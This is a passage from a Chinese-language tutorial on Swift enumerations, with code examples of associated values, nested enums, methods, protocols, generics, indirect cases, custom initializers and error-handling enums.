    case Delete = 0x00000001
    case Write = 0x00000002
    case Extended = 0x00000004
    case Attrib = 0x00000008
    case Link = 0x00000010
    case Rename = 0x00000020
    case Revoke = 0x00000040
    case None = 0x00000080
}
</code></pre>
<p>如此便可以使你的<strong>Delete</strong>或<strong>Write</strong>用例声明一目了然，稍后一旦需要，只需将<strong>raw value</strong>传入 C 函数中即可。</p>
<h3>嵌套枚举(Nesting Enums)</h3>
<p>如果你有特定子类型的需求，可以对<code>enum</code>进行嵌套。这样就允许你为实际的<code>enum</code>中包含其他明确信息的<code>enum</code>。以<strong>RPG</strong>游戏中的每个角色为例，每个角色能够拥有武器，因此所有角色都可以获取同一个武器集合。而游戏中的其他实例则无法获取这些武器(比如食人魔,它们仅使用棍棒)。</p>
<pre><code>
enum Character {
  enum Weapon {
    case Bow
    case Sword
    case Lance
    case Dagger
  }
  enum Helmet {
    case Wooden
    case Iron
    case Diamond
  }
  case Thief
  case Warrior
  case Knight
}
</code></pre>
<p>现在，你可以通过层级结构来描述角色允许访问的项目条。</p>
<pre><code>
let character = Character.Thief
let weapon = Character.Weapon.Bow
let helmet = Character.Helmet.Iron
</code></pre>
<h3>包含枚举(Containing Enums)</h3>
<p>同样地，你也能够在<code>structs</code>或<code>classes</code>中内嵌枚举。接着上面的例子:</p>
<pre><code>
struct Character {
   enum CharacterType {
    case Thief
    case Warrior
    case Knight
  }
  enum Weapon {
    case Bow
    case Sword
    case Lance
    case Dagger
  }
  let type: CharacterType
  let weapon: Weapon
}

let warrior = Character(type: .Warrior, weapon: .Sword)
</code></pre>
<p>同样地，这也将有助于我们将相关的信息集中在一个位置。</p>
<h3>关联值(Associated Value)</h3>
<p>关联值是将额外信息附加到<code>enum case</code>中的一种极好的方式。打个比方，你正在开发一款交易引擎，可能存在<strong>买</strong>和<strong>卖</strong>两种不同的交易类型。除此之外每手交易还要制定明确的股票名称和交易数量:</p>
<h4>简单例程(Simple Example)</h4>
<pre><code>
enum Trade {
    case Buy
    case Sell
}
func trade(tradeType: Trade, stock: String, amount: Int) {}</code></pre>
<p>然而股票的价值和数量显然从属于交易，让他们作为独立的参数显得模棱两可。你可能已经想到要往<code>struct</code>中内嵌一个枚举了，不过关联值提供了一种更清爽的解决方案：</p>
<pre><code>
enum Trade {
    case Buy(stock: String, amount: Int)
    case Sell(stock: String, amount: Int)
}
func trade(type: Trade) {}
</code></pre>
<h4>模式匹配(Pattern Mathching)</h4>
<p>如果你想要访问这些值，<a href=""http://appventure.me/2015/08/20/swift-pattern-matching-in-detail/"" rel=""nofollow noreferrer"">模式匹配</a>再次救场:</p>
<pre><code>
let trade = Trade.Buy(stock: ""APPL"", amount: 500)
if case let Trade.Buy(stock, amount) = trade {
    print(""buy \(amount) of \(stock)"")
}
</code></pre>
<h4>标签(Labels)</h4>
<p>关联值不需要附加标签的声明:</p>
<pre><code>
enum Trade {
   case Buy(String, Int)
   case Sell(String, Int)
}</code></pre>
<p>倘若你添加了，那么，每当创建枚举用例时，你都需要将这些标签标示出来。</p>
<h4>元组参数(Tuple as Arguments)</h4>
<p>更重要的是,<code>Swift</code>内部相关信息其实是一个元组,所以你可以像下面这样做:</p>
<pre><code>
let tp = (stock: ""TSLA"", amount: 100)
let trade = Trade.Sell(tp)

if case let Trade.Sell(stock, amount) = trade {
    print(""buy \(amount) of \(stock)"")
}
// Prints: ""buy 100 of TSLA""
</code></pre>
<p>语法允许您将元组当作一个简单的数据结构,稍后元组将自动转换到高级类型，就比如<code>enum case</code>。想象一个应用程序可以让用户来配置电脑:</p>
<pre><code>
typealias Config = (RAM: Int, CPU: String, GPU: String)

// Each of these takes a config and returns an updated config
func selectRAM(_ config: Config) -&gt; Config {return (RAM: 32, CPU: config.CPU, GPU: config.GPU)}
func selectCPU(_ config: Config) -&gt; Config {return (RAM: config.RAM, CPU: ""3.2GHZ"", GPU: config.GPU)}
func selectGPU(_ config: Config) -&gt; Config {return (RAM: config.RAM, CPU: ""3.2GHZ"", GPU: ""NVidia"")}

enum Desktop {
   case Cube(Config)
   case Tower(Config)
   case Rack(Config)
}

let aTower = Desktop.Tower(selectGPU(selectCPU(selectRAM((0, """", """") as Config))))
</code></pre>
<p>配置的每个步骤均通过递交元组到<code>enum</code>中进行内容更新。倘若我们从<strong>函数式编程</strong><a><sup>2<sup></sup></sup></a>中获得启发，这将变得更好。</p>
<pre><code>
infix operator &lt;^&gt; { associativity left }

func &lt;^&gt;(a: Config, f: (Config) -&gt; Config) -&gt; Config { 
    return f(a)
}
</code></pre>
<p>最后，我们可以将不同配置步骤串联起来。这在配置步骤繁多的情况下相当有用。</p>
<pre><code>
let config = (0, """", """") &lt;^&gt; selectRAM  &lt;^&gt; selectCPU &lt;^&gt; selectGPU
let aCube = Desktop.Cube(config)
</code></pre>
<h4>使用案例(Use Case Example)</h4>
<p>关联值可以以多种方式使用。常言道：一码胜千言, 下面就上几段简单的示例代码，这几段代码没有特定的顺序。</p>
<pre><code>
// 拥有不同值的用例
enum UserAction {
  case OpenURL(url: NSURL)
  case SwitchProcess(processId: UInt32)
  case Restart(time: NSDate?, intoCommandLine: Bool)
}

// 假设你在实现一个功能强大的编辑器，这个编辑器允许多重选择，
// 正如 Sublime Text : https://www.youtube.com/watch?v=i2SVJa2EGIw
enum Selection {
  case None
  case Single(Range&lt;Int&gt;)
  case Multiple([Range&lt;Int&gt;])
}

// 或者映射不同的标识码
enum Barcode {
    case UPCA(numberSystem: Int, manufacturer: Int, product: Int, check: Int)
    case QRCode(productCode: String)
}

// 又或者假设你在封装一个 C 语言库，正如 Kqeue BSD/Darwin 通知系统:
// https://www.freebsd.org/cgi/man.cgi?query=kqueue&amp;sektion=2
enum KqueueEvent {
    case UserEvent(identifier: UInt, fflags: [UInt32], data: Int)
    case ReadFD(fd: UInt, data: Int)
    case WriteFD(fd: UInt, data: Int)
    case VnodeFD(fd: UInt, fflags: [UInt32], data: Int)
    case ErrorEvent(code: UInt, message: String)
}

// 最后, 一个 RPG 游戏中的所有可穿戴装备可以使用一个枚举来进行映射，
// 可以为一个装备增加重量和持久两个属性
// 现在可以仅用一行代码来增加一个""钻石""属性，如此一来我们便可以增加几件新的镶嵌钻石的可穿戴装备
enum Wearable {
    enum Weight: Int {
    case Light = 1
    case Mid = 4
    case Heavy = 10
    }
    enum Armor: Int {
    case Light = 2
    case Strong = 8
    case Heavy = 20
    }
    case Helmet(weight: Weight, armor: Armor)
    case Breastplate(weight: Weight, armor: Armor)
    case Shield(weight: Weight, armor: Armor)
}
let woodenHelmet = Wearable.Helmet(weight: .Light, armor: .Light)
</code></pre>
<h3>方法和属性(Methods and properties)</h3>
<p>你也可以在<code>enum</code>中像这样定义方法:</p>
<pre><code>
enum Wearable {
    enum Weight: Int {
        case Light = 1
    }
    enum Armor: Int {
        case Light = 2
    }
    case Helmet(weight: Weight, armor: Armor)
        func attributes() -&gt; (weight: Int, armor: Int) {
       switch self {
             case .Helmet(let w, let a): return (weight: w.rawValue * 2, armor: w.rawValue * 4)
       }
    }
}
let woodenHelmetProps = Wearable.Helmet(weight: .Light, armor: .Light).attributes()
print (woodenHelmetProps)
// prints ""(2, 4)""
</code></pre>
<p>枚举中的方法为每一个<code>enum case</code>而“生”。所以倘若想要在特定情况执行特定代码的话，你需要分支处理或采用<code>switch</code>语句来明确正确的代码路径。</p>
<pre><code>
enum Device { 
    case iPad, iPhone, AppleTV, AppleWatch 
    func introduced() -&gt; String {
       switch self {
         case AppleTV: return ""\(self) was introduced 2006""
         case iPhone: return ""\(self) was introduced 2007""
         case iPad: return ""\(self) was introduced 2010""
         case AppleWatch: return ""\(self) was introduced 2014""
       }
    }
}
print (Device.iPhone.introduced())
// prints: ""iPhone was introduced 2007""
</code></pre>
<h4>属性(Properties)</h4>
<p>尽管增加一个存储属性到枚举中不被允许，但你依然能够创建计算属性。当然，计算属性的内容都是建立在枚举值下或者枚举关联值得到的。</p>
<pre><code>
enum Device {
  case iPad, iPhone
  var year: Int {
    switch self {
        case iPhone: return 2007
        case iPad: return 2010
     }
  }
}
</code></pre>
<h4>静态方法(Static Methods)</h4>
<p>你也能够为枚举创建一些静态方法(<code>static methods</code>)。换言之通过一个非枚举类型来创建一个枚举。在这个示例中,我们需要考虑用户有时将苹果设备叫错的情况(比如AppleWatch叫成iWatch)，需要返回一个合适的名称。</p>
<pre><code>
enum Device { 
    case AppleWatch 
    static func fromSlang(term: String) -&gt; Device? {
      if term == ""iWatch"" {
      return .AppleWatch
      }
      return nil
    }
}
print (Device.fromSlang(""iWatch""))
</code></pre>
<h4>可变方法(Mutating Methods)</h4>
<p>方法可以声明为<code>mutating</code>。这样就允许改变隐藏参数<code>self</code>的<code>case</code>值了<a><sup>3<sup></sup></sup></a>。</p>
<pre><code>
enum TriStateSwitch {
    case Off, Low, High
    mutating func next() {
    switch self {
    case Off:
        self = Low
    case Low:
        self = High
    case High:
        self = Off
    }
    }
}
var ovenLight = TriStateSwitch.Low
ovenLight.next()
// ovenLight 现在等于.On
ovenLight.next()
// ovenLight 现在等于.Off</code></pre>
<h3>小结(To Recap)</h3>
<p>至此，我们已经大致了解了Swift中枚举语法的基本用例。在开始迈向进阶之路之前，让我们重新审视文章开篇给出的定义，看看现在是否变得更清晰了。</p>
<blockquote><p>枚举声明的类型是囊括可能状态的有限集，且可以具有附加值。通过内嵌(<em>nesting</em>),方法(<em>method</em>),关联值(<em>associated values</em>)和模式匹配(<em>pattern matching</em>),枚举可以分层次地定义任何有组织的数据。</p></blockquote>
<p>现在我们已经对这个定义更加清晰了。确实，如果我们添加关联值和嵌套，<code>enum</code>就看起来就像一个封闭的、简化的<code>struct</code>。相比较<code>struct</code>，前者优势体现在能够为分类与层次结构编码。</p>
<pre><code>
// Struct Example
struct Point { let x: Int, let y: Int }
struct Rect { let x: Int, let y: Int, let width: Int, let height: Int }

// Enum Example
enum GeometricEntity {
   case Point(x: Int, y: Int)
   case Rect(x: Int, y: Int, width: Int, height: Int)
}
</code></pre>
<p>方法和静态方法的添加允许我们为<code>enum</code>附加功能，这意味着无须依靠额外函数就能实现<a><sup>4<sup></sup></sup></a>。</p>
<pre><code>
// C-Like example
enum Trade {
   case Buy
   case Sell
}
func order(trade: Trade)

// Swift Enum example
enum Trade {
   case Buy
   case Sell
   func order()
}
</code></pre>
<h2>枚举进阶(Advanced Enum Usage）</h2>
<h3>协议(Protocols)</h3>
<p>我已经提及了<code>structs</code>和<code>enums</code>之间的相似性。除了附加方法的能力之外，<code>Swift</code>也允许你在枚举中使用<strong>协议(Protocols)</strong>和<strong>协议扩展(Protocol Extension)</strong>。</p>
<p><code>Swift</code>协议定义一个接口或类型以供其他数据结构来遵循。<code>enum</code>当然也不例外。我们先从<code>Swift</code>标准库中的一个例子开始.</p>
<p><code>CustomStringConvertible</code>是一个以打印为目的的自定义格式化输出的类型。</p>
<pre><code>
protocol CustomStringConvertible {
  var description: String { get }
}
</code></pre>
<p>该协议只有一个要求，即一个只读(<code>getter</code>)类型的字符串(<code>String</code>类型)。我们可以很容易为<code>enum</code>实现这个协议。</p>
<pre><code>
enum Trade: CustomStringConvertible {
   case Buy, Sell
   var description: String {
       switch self {
       case Buy: return ""We're buying something""
       case Sell: return ""We're selling something""
       }
   }
}

let action = Trade.Buy
print(""this action is \(action)"")
// prints: this action is We're buying something
</code></pre>
<p>一些协议的实现可能需要根据内部状态来相应处理要求。例如定义一个管理银行账号的协议。</p>
<pre><code>
protocol AccountCompatible {
  var remainingFunds: Int { get }
  mutating func addFunds(amount: Int) throws
  mutating func removeFunds(amount: Int) throws
}
</code></pre>
<p>你也许会简单地拿<code>struct</code>实现这个协议，但是考虑应用的上下文，<code>enum</code>是一个更明智的处理方法。不过你无法添加一个存储属性到<code>enum</code>中，就像<code>var remainingFuns:Int</code>。那么你会如何构造呢？答案灰常简单，你可以使用关联值完美解决:</p>
<pre><code>
enum Account {
  case Empty
  case Funds(remaining: Int)

  enum Error: ErrorType {
    case Overdraft(amount: Int)
  }

  var remainingFunds: Int {
    switch self {
    case Empty: return 0
    case Funds(let remaining): return remaining
    }
  }
}
</code></pre>
<p>为了保持代码清爽，我们可以在<code>enum</code>的协议扩展(<code>protocl extension</code>)中定义必须的协议函数:</p>
<pre><code>
extension Account: AccountCompatible {

  mutating func addFunds(amount: Int) throws {
    var newAmount = amount
    if case let .Funds(remaining) = self {
      newAmount += remaining
    }
    if newAmount &lt; 0 {
      throw Error.Overdraft(amount: -newAmount)
    } else if newAmount == 0 {
      self = .Empty
    } else {
      self = .Funds(remaining: newAmount)
    }
  }

  mutating func removeFunds(amount: Int) throws {
    try self.addFunds(amount * -1)
  }

}
var account = Account.Funds(remaining: 20)
print(""add: "", try? account.addFunds(10))
print (""remove 1: "", try? account.removeFunds(15))
print (""remove 2: "", try? account.removeFunds(55))
// prints:
// : add:  Optional(())
// : remove 1:  Optional(())
// : remove 2:  nil
</code></pre>
<p>正如你所看见的，我们通过将值存储到<code>enum cases</code>中实现了协议所有要求项。如此做法还有一个妙不可言的地方:现在整个代码基础上你只需要一个模式匹配就能测试空账号输入的情况。你不需要关心剩余资金是否等于零。</p>
<p>同时，我们也在<strong>账号(Accout)</strong>中内嵌了一个遵循<code>ErrorType</code>协议的枚举，这样我们就可以使用<code>Swift2.0</code>语法来进行错误处理了。这里给出更详细的<a href=""http://appventure.me/2015/10/17/advanced-practical-enum-examples/#errortype"" rel=""nofollow noreferrer"">使用案例</a>教程。</p>
<h3>扩展(Extensions)</h3>
<p>正如刚才所见，枚举也可以进行扩展。最明显的用例就是将枚举的<code>case</code>和<code>method</code>分离，这样阅读你的代码能够简单快速地消化掉<code>enum</code>内容，紧接着转移到方法定义:</p>
<pre><code>
enum Entities {
    case Soldier(x: Int, y: Int)
    case Tank(x: Int, y: Int)
    case Player(x: Int, y: Int)
}
</code></pre>
<p>现在，我们为<code>enum</code>扩展方法:</p>
<pre><code>
extension Entities {
   mutating func move(dist: CGVector) {}
   mutating func attack() {}
}
</code></pre>
<p>你同样可以通过写一个扩展来遵循一个特定的协议:</p>
<pre><code>
extension Entities: CustomStringConvertible {
  var description: String {
    switch self {
       case let .Soldier(x, y): return ""\(x), \(y)""
       case let .Tank(x, y): return ""\(x), \(y)""
       case let .Player(x, y): return ""\(x), \(y)""
    }
  }
}</code></pre>
<h3>枚举泛型(Generic Enums)</h3>
<p>枚举也支持泛型参数定义。你可以使用它们以适应枚举中的关联值。就拿直接来自<code>Swift</code>标准库中的简单例子来说，即<code>Optional</code>类型。你主要可能通过以下几种方式使用它:可选链(<code>optional chaining(?)</code>)、<code>if-let</code>可选绑定、<code>guard let</code>、或<code>switch</code>，但是从语法角度来说你也可以这么使用<code>Optional</code>:</p>
<pre><code>
let aValue = Optional&lt;Int&gt;.Some(5)
let noValue = Optional&lt;Int&gt;.None
if noValue == Optional.None { print(""No value"") }
</code></pre>
<p>这是<code>Optional</code>最直接的用例，并未使用任何语法糖，但是不可否认<code>Swift</code>中语法糖的加入使得你的工作更简单。如果你观察上面的实例代码，你恐怕已经猜到<code>Optional</code>内部实现是这样的<a><sup>5<sup></sup></sup></a>:</p>
<pre><code>
// Simplified implementation of Swift's Optional
enum MyOptional&lt;T&gt; {
  case Some(T)
  case None
}
</code></pre>
<p>这里有啥特别呢？注意枚举的关联值采用泛型参数<code>T</code>作为自身类型，这样可选类型构造任何你想要的返回值。</p>
<p>枚举可以拥有多个泛型参数。就拿熟知的<code>Either</code>类为例，它并非是<code>Swift</code>标准库中的一部分，而是实现于众多开源库以及<br>其他函数式编程语言，比如<strong>Haskell</strong>或<strong>F#</strong>。设计想法是这样的:相比较仅仅返回一个值或没有值(née Optional)，你更期望返回一个成功值或者一些反馈信息(比如错误值)。</p>
<pre><code>
// The well-known either type is, of course, an enum that allows you to return either
// value one (say, a successful value) or value two (say an error) from a function
enum Either&lt;T1, T2&gt; {
  case Left(T1)
  case Right(T2)
}</code></pre>
<p>最后，<code>Swift</code>中所有在<code>class</code>和<code>struct</code>中奏效的类型约束，在<code>enum</code>中同样适用。</p>
<pre><code>
// Totally nonsensical example. A bag that is either full (has an array with contents)
// or empty.
enum Bag&lt;T: SequenceType where T.Generator.Element==Equatable&gt; {
  case Empty
  case Full(contents: T)
}
</code></pre>
<h3>递归 / 间接(Indirect)类型</h3>
<p>间接类型是 Swift 2.0 新增的一个类型。 它们允许将枚举中一个 case 的关联值再次定义为枚举。举个例子，假设我们想定义一个文件系统，用来表示文件以及包含文件的目录。如果将<em>文件</em>和<em>目录</em>定义为枚举的 case，则<em>目录</em> case 的关联值应该再包含一个<em>文件</em>的数组作为它的关联值。因为这是一个递归的操作，编译器需要对此进行一个特殊的准备。Swift 文档中是这么写的：</p>
<blockquote><p>枚举和 case 可以被标记为间接的(indrect)，这意味它们的关联值是被间接保存的，这允许我们定义递归的数据结构。</p></blockquote>
<p>所以，如果我们要定义 <code>FileNode</code> 的枚举，它应该会是这样的：</p>
<pre><code>
enum FileNode {
  case File(name: String)
  indirect case Folder(name: String, files: [FileNode])
}
</code></pre>
<p>此处的 <code>indrect</code> 关键字告诉编译器间接地处理这个枚举的 case。也可以对整个枚举类型使用这个关键字。<a href=""http://airspeedvelocity.net/2015/07/22/a-persistent-tree-using-indirect-enums-in-swift/"" rel=""nofollow noreferrer"">作为例子，我们来定义一个二叉树</a>:</p>
<pre><code>
indirect enum Tree&lt;Element: Comparable&gt; {
    case Empty
    case Node(Tree&lt;Element&gt;,Element,Tree&lt;Element&gt;)
}
</code></pre>
<p>这是一个很强大的特性，可以让我们用非常简洁的方式来定义一个有着复杂关联的数据结构。</p>
<h3>使用自定义类型作为枚举的值</h3>
<p>如果我们忽略关联值，则枚举的值就只能是整型，浮点型，字符串和布尔类型。如果想要支持别的类型，则可以通过实现 <code>StringLiteralConvertible</code> 协议来完成，这可以让我们通过对字符串的序列化和反序列化来使枚举支持自定义类型。</p>
<p>作为一个例子，假设我们要定义一个枚举来保存不同的 iOS 设备的屏幕尺寸：</p>
<pre><code>
enum Devices: CGSize {
   case iPhone3GS = CGSize(width: 320, height: 480)
   case iPhone5 = CGSize(width: 320, height: 568)
   case iPhone6 = CGSize(width: 375, height: 667)
   case iPhone6Plus = CGSize(width: 414, height: 736)
}
</code></pre>
<p>然而，这段代码不能通过编译。因为 CGPoint 并不是一个常量，不能用来定义枚举的值。我们需要为想要支持的自定义类型增加一个扩展，让其实现 <code>StringLiteralConvertible</code> 协议。这个协议要求我们实现三个<em>构造方法</em>，这三个方法都需要使用一个<code>String</code>类型的参数，并且我们需要将这个字符串转换成我们需要的类型(此处是<code>CGSize</code>)。</p>
<pre><code>
extension CGSize: StringLiteralConvertible {
    public init(stringLiteral value: String) {
    let size = CGSizeFromString(value)
    self.init(width: size.width, height: size.height)
    }

    public init(extendedGraphemeClusterLiteral value: String) {
    let size = CGSizeFromString(value)
    self.init(width: size.width, height: size.height)
    }

    public init(unicodeScalarLiteral value: String) {
    let size = CGSizeFromString(value)
    self.init(width: size.width, height: size.height)
    }
}
</code></pre>
<p>现在就可以来实现我们需要的枚举了，不过这里有一个缺点：初始化的值必须写成字符串形式，因为这就是我们定义的枚举需要接受的类型(记住，我们实现了 StringLiteralConvertible，因此<strong>String</strong>可以转化成<code>CGSize</code>类型)</p>
<pre><code>
enum Devices: CGSize {
   case iPhone3GS = ""{320, 480}""
   case iPhone5 = ""{320, 568}""
   case iPhone6 = ""{375, 667}""
   case iPhone6Plus = ""{414, 736}""
}
</code></pre>
<p>终于，我们可以使用 CGPoint 类型的枚举了。需要注意的是，当要获取真实的 CGPoint 的值的时候，我们需要访问枚举的是 <code>rawValue</code> 属性。</p>
<pre><code>
let a = Devices.iPhone5
let b = a.rawValue
print(""the phone size string is \(a), width is \(b.width), height is \(b.height)"")
// prints : the phone size string is iPhone5, width is 320.0, height is 568.0
</code></pre>
<p>使用字符串序列化的形式，会让使用自定义类型的枚举比较困难，然而在某些特定的情况下，这也会给我们增加不少便利(比较使用<strong>NSColor</strong> / <strong>UIColor</strong>的时候)。不仅如此，我们完全可以对自己定义的类型使用这个方法。</p>
<h3>对枚举的关联值进行比较</h3>
<p>在通常情况下，枚举是很容易进行相等性判断的。一个简单的 <code>enum T { case a, b }</code> 实现默认支持相等性判断 <code>T.a == T.b, T.b != T.a</code></p>
<p>然而，一旦我们为枚举增加了关联值，Swift 就没有办法正确地为两个枚举进行相等性判断，需要我们自己实现 <code>==</code> 运行符。这并不是很困难：</p>
<pre><code>
enum Trade {
    case Buy(stock: String, amount: Int)
    case Sell(stock: String, amount: Int)
}
func ==(lhs: Trade, rhs: Trade) -&gt; Bool {
   switch (lhs, rhs) {
     case let (.Buy(stock1, amount1), .Buy(stock2, amount2))
       where stock1 == stock2 &amp;&amp; amount1 == amount2:
       return true
     case let (.Sell(stock1, amount1), .Sell(stock2, amount2))
       where stock1 == stock2 &amp;&amp; amount1 == amount2:
       return true
     default: return false
   }
}
</code></pre>
<p>正如我们所见，我们通过 switch 语句对两个枚举的 case 进行判断，并且只有当它们的 case 是匹配的时候(比如 Buy 和 Buy)才对它们的真实关联值进行判断。</p>
<h3>自定义构造方法</h3>
<p>在 <strong>静态方法</strong> 一节当中我们已经提到它们可以作为从不同数据构造枚举的方便形式。在之前的例子里也展示过，对出版社经常误用的苹果设备名返回正确的名字：</p>
<pre><code>
enum Device { 
    case AppleWatch 
    static func fromSlang(term: String) -&gt; Device? {
      if term == ""iWatch"" {
      return .AppleWatch
      }
      return nil
    }
}
</code></pre>
<p>我们也可以使用自定义构造方法来替换静态方法。枚举与结构体和类的构造方法最大的不同在于，枚举的构造方法需要将隐式的 <code>self</code>  属性设置为正确的 case。</p>
<pre><code>
enum Device { 
    case AppleWatch 
    init?(term: String) {
      if term == ""iWatch"" {
      self = .AppleWatch
      }
      return nil
    }
}
</code></pre>
<p>在这个例子中，我们使用了可失败(failable)的构造方法。但是，普通的构造方法也可以工作得很好：</p>
<pre><code>
enum NumberCategory {
   case Small
   case Medium
   case Big
   case Huge
   init(number n: Int) {
    if n &lt; 10000 { self = .Small }
    else if n &lt; 1000000 { self = .Medium }
    else if n &lt; 100000000 { self = .Big }
    else { self = .Huge }
   }
}
let aNumber = NumberCategory(number: 100)
print(aNumber)
// prints: ""Small""
</code></pre>
<h3>对枚举的 case 进行迭代</h3>
<p>一个特别经常被问到的问题就是如何对枚举中的 case 进行迭代。可惜的是，枚举并没有遵守<code>SequenceType</code>协议，因此没有一个官方的做法来对其进行迭代。取决于枚举的类型，对其进行迭代可能也简单，也有可能很困难。在<a href=""http://stackoverflow.com/questions/24007461/how-to-enumerate-an-enum-with-string-type"" rel=""nofollow noreferrer"">StackOverflow</a>上有一个很好的讨论贴。贴子里面讨论到的不同情况太多了，如果只在这里摘取一些会有片面性，而如果将全部情况都列出来，则会太多。</p>
<h3>对 Objective-C 的支持</h3>
<p>基于整型的枚举，如 <code>enum Bit: Int { case Zero = 0; case One = 1 }</code> 可以通过 <code>@objc</code> 标识来将其桥接到 Objective-C 当中。然而，一旦使用整型之外的类型(如 <code>String</code>)或者开始使用<strong>关联值</strong>，我们就无法在 Objective-C 当中使用这些枚举了。</p>
<p>有一个名为<a href=""http://nshint.io/blog/2015/10/07/easy-cast-with-_ObjectiveCBridgeable/?utm_campaign=Swift%252BSandbox&amp;utm_medium=email&amp;utm_source=Swift_Sandbox_11"" rel=""nofollow noreferrer"">_ObjectiveCBridgeable的隐藏协议</a>，可以让规范我们以定义合适的方法，如此一来，Swift 便可以正确地将枚举转成 Objective-C 类型，但我猜这个协议被隐藏起来一定是有原因的。然而，从理论上来讲，这个协议还是允许我们将枚举(包括其实枚举值)正确地桥接到 Objective-C 当中。</p>
<p>但是，我们并不一定非要使用上面提到的这个方法。为枚举添加两个方法，使用 <code>@objc</code> 定义一个替代类型，如此一来我们便可以自由地将枚举进行转换了，并且这种方式不需要遵守私有协议：</p>
<pre><code>
enum Trade {
    case Buy(stock: String, amount: Int)
    case Sell(stock: String, amount: Int)
}

// 这个类型也可以定义在 Objective-C 的代码中
@objc class OTrade: NSObject {
    var type: Int
    var stock: String
    var amount: Int
    init(type: Int, stock: String, amount: Int) {
    self.type = type
    self.stock = stock
    self.amount = amount
    }
}

extension Trade  {

    func toObjc() -&gt; OTrade {
    switch self {
    case let .Buy(stock, amount):
        return OTrade(type: 0, stock: stock, amount: amount)
    case let .Sell(stock, amount):
        return OTrade(type: 1, stock: stock, amount: amount)
    }
    }

    static func fromObjc(source: OTrade) -&gt; Trade? {
    switch (source.type) {
    case 0: return Trade.Buy(stock: source.stock, amount: source.amount)
    case 1: return Trade.Sell(stock: source.stock, amount: source.amount)
    default: return nil
    }
    }
}
</code></pre>
<p>这个方法有一个的缺点，我们需要将枚举映射为 Objective-C 中的 <code>NSObject</code> 基础类型(我们也可以直接使用 <code>NSDictionary</code>)，但是，当我们碰到一些确实<strong>需要</strong>在 Objective-C 当中获取有关联值的枚举时，这是一个可以使用的方法。</p>
<h3>枚举底层</h3>
<p>Erica Sadun 写过一篇很流弊的<a href=""http://ericasadun.com/2015/07/12/swift-enumerations-or-how-to-annoy-tom/"" rel=""nofollow noreferrer"">关于枚举底层的博客</a>，涉及到枚举底层的方方面面。在生产代码中绝不应该使用到这些东西，但是学习一下还是相当有趣的。在这里，我准备只提到那篇博客中一条，如果想了解更多，请移步到原文：</p>
<blockquote><p>枚举通常都是一个字节长度。[...]如果你真的很傻很天真，你当然可以定义一个有成百上千个 case 的枚举，在这种情况下，取决于最少所需要的比特数，枚举可能占据两个字节或者更多。</p></blockquote>
<h2>Swift 标准库中的枚举</h2>
<p>在我们准备继续探索枚举在项目中的不同用例之前，先看一下在 Swift 标准库当中是如何使用枚举可能会更诱人，所以现在让我们先来看看。</p>
<ul>
<li><p><a href=""https://developer.apple.com/library/watchos/documentation/Swift/Reference/Swift_Bit_Enumeration/index.html#//apple_ref/swift/enum/s:OSs3Bit"" rel=""nofollow noreferrer"">Bit</a> 这个枚举有两个值，<strong>One</strong> 和 <strong>Zero</strong>。它被作为 <code>CollectionOfOne&lt;T&gt;</code> 中的 <code>Index</code> 类型。</p></li>
<li><p><a href=""https://developer.apple.com/library/watchos/documentation/Swift/Reference/Swift_FloatingPointClassification_Enumeration/index.html#//apple_ref/swift/enumelt/FloatingPointClassification/s:FOSs27FloatingPointClassification12SignalingNaNFMS_S_"" rel=""nofollow noreferrer"">FloatingPointClassification</a> 这个枚举定义了一系列 IEEE 754 可能的类别，比如 <code>NegativeInfinity</code>, <code>PositiveZero</code> 或 <code>SignalingNaN</code>。</p></li>
<li><p><a href=""https://developer.apple.com/library/watchos/documentation/Swift/Reference/Swift_Mirror-AncestorRepresentation_Enumeration/index.html#//apple_ref/swift/enum/s:OVSs6Mirror22AncestorRepresentation"" rel=""nofollow noreferrer"">Mirror.AncestorRepresentation</a> 和 <a href=""https://developer.apple.com/library/watchos/documentation/Swift/Reference/Swift_Mirror-DisplayStyle_Enumeration/index.html#//apple_ref/swift/enum/s:OVSs6Mirror12DisplayStyle"" rel=""nofollow noreferrer"">Mirror.DisplayStyle</a> 这两个枚举被用在 Swift 反射 API 的上下文当中。</p></li>
<li><p><a href=""https://developer.apple.com/library/watchos/documentation/Swift/Reference/Swift_Optional_Enumeration/index.html#//apple_ref/swift/enum/s:Sq"" rel=""nofollow noreferrer"">Optional</a> 这个就不用多说了</p></li>
<li><p><a href=""https://developer.apple.com/library/watchos/documentation/Swift/Reference/Swift_Process_Enumeration/index.html#//apple_ref/swift/enum/s:OSs7Process"" rel=""nofollow noreferrer"">Process</a> 这个枚举包含了当前进程的命令行参数(<code>Process.argc</code>, <code>Process.arguments</code>)。这是一个相当有趣的枚举类型，因为在 Swift 1.0 当中，它是被作为一个结构体来实现的。</p></li>
</ul>
<h2>实践用例</h2>
<p>我们已经在前面几个小节当中看过了许多有用的枚举类型。包括 <code>Optional</code>，<code>Either</code>, <code>FileNode</code> 还有二叉树。然而，还存在很多场合，使用枚举要胜过使用结构体和类。一般来讲，如果问题可以被分解为有限的不同类别，则使用枚举应该就是正确的选择。即使只有两种 case，这也是一个使用枚举的完美场景，正如 Optional 和 Either 类型所展示的。</p>
<p>以下列举了一些枚举类型在实战中的使用示例，可以用来点燃你的创造力。</p>
<h3>错误处理</h3>
<p>说到枚举的实践使用，当然少不了在 Swift 2.0 当中新推出的错误处理。标记为可抛出的函数可以抛出任何遵守了 <code>ErrorType</code> 空协议的类型。正如 Swift 官方文档中所写的：</p>
<blockquote><p>Swift 的枚举特别适用于构建一组相关的错误状态，可以通过关联值来为其增加额外的附加信息。</p></blockquote>
<p>作为一个示例，我们来看下流行的<a href=""https://github.com/thoughtbot/Argo"" rel=""nofollow noreferrer"">JSON解析框架 Argo</a>。当 JSON 解析失败的时候，它有可能是以下两种主要原因：</p>
<ol>
<li><p>JSON 数据缺少某些最终模型所需要的键(比如你的模型有一个 <code>username</code> 的属性，但是 JSON 中缺少了)</p></li>
<li><p>存在类型不匹配，比如说 <code>username</code> 需要的是 String 类型，而 JSON 中包含的是 <code>NSNull</code><a><sup>6</sup></a>。</p></li>
</ol>
<p>除此之外，Argo 还为不包含在上述两个类别中的错误提供了自定义错误。它们的 <code>ErrorType</code> 枚举是类似这样的：</p>
<pre><code>
enum DecodeError: ErrorType {
  case TypeMismatch(expected: String, actual: String)
  case MissingKey(String)
  case Custom(String)
}
</code></pre>
<p>所有的 case 都有一个关联值用来包含关于错误的附加信息。</p>
<p>一个更加通用的用于完整 HTTP / REST API 错误处理的<code>ErrorType</code>应该是类似这样的：</p>
<pre><code>
enum APIError : ErrorType {
    // Can't connect to the server (maybe offline?)
    case ConnectionError(error: NSError)
    // The server responded with a non 200 status code
    case ServerError(statusCode: Int, error: NSError)
